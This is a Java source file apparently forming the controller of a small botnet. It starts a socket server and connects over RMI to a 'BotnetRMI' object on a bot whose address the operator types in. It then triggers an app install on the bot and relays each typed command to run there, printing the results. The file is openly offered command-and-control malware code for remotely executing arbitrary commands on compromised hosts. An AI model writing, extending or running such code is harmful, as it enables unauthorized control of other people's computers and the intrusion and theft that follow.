/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package server;

import SServer_package.SServer;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.NetworkInterface;
import java.net.Socket;
import java.net.SocketException;
import java.rmi.Naming;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;
import rmi.IBotnet;

public class RMIServer {
    
    public static void main(String[] args) {
        try {
            SServer sserver = new SServer(2345);
            sserver.start();
            System.out.println(">>>>>INFO: Socket Server started!!!!!!!!");
            
            IBotnet botnet = null;
            Scanner scanner = new Scanner(System.in);
            System.out.println("Bot IP: ");
            String ip = scanner.nextLine();
            System.out.println("Port: ");
            String port = scanner.nextLine();
            botnet = (IBotnet) Naming.lookup("rmi://" + ip + ":" + port + "/BotnetRMI");
            botnet.testing();
            
            System.out.println(">>>>>Install app/tools!!!!!!!!");
            botnet.installApp();
            
            while (true){
                String cmd = scanner.nextLine();
                System.out.println("New command: " + cmd);
                if(cmd != null){
                    ArrayList<String> arr = botnet.runCommand(cmd);
                    for(String i:arr){
                        System.out.println(i);
                    }
                }
            }
            
        } catch (RemoteException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (NotBoundException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (MalformedURLException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(RMIServer.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
}
